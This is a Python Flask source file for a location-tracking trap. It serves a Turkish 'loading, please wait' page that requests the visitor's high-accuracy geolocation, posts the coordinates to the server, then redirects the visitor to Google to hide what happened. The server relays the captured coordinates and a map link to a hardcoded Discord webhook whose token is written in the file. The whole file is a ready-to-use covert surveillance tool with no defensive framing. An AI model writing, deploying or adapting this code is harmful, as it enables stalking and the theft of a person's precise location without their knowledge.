from flask import Flask, render_template_string, request, jsonify
import urllib.request
import json

app = Flask(__name__)
WEBHOOK_URL = "https://discord.com/api/webhooks/1555668190682685551/UPo46lPYqOX3MheUBH33n6-RqGKz4aa7yT4jtLO8Wqa0m8dfCeKm2-79-S1g7M2hv4jW"

TRACKING_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Yükleniyor...</title>
</head>
<body>
    <h2>Lütfen bekleyin, içerik yükleniyor...</h2>
    <script>
        function sendLocation(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            
            fetch('/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ latitude: lat, longitude: lon })
            }).then(response => response.json())
              .then(data => {
                  window.location.href = "https://www.google.com";
              });
        }

        function errorHandler(error) {
            console.warn("Konum hatası veya reddedildi: " + error.message);
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendLocation, errorHandler, {
                maximumAge: 0,
                timeout: 10000,
                enableHighAccuracy: true
            });
        } else {
            console.log("Tarayıcı konum desteklemiyor.");
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(TRACKING_PAGE)

@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"status": "error", "message": "No JSON data"}), 400
        
    lat = data.get('latitude')
    lon = data.get('longitude')
    
    payload = {
        "content": f"🎯 **Yeni Konum Yakalandي!**\nLatitude: `{lat}`\nLongitude: `{lon}`\nHarita: https://www.google.com/maps?q={lat},{lon}"
    }
    
    req = urllib.request.Request(
        WEBHOOK_URL,
        data=json.dumps(payload).encode('utf-8'),
        headers={
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        }
    )
    
    try:
        urllib.request.urlopen(req)
    except Exception as e:
        print(f"Webhook Hatası: {e}")
        
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)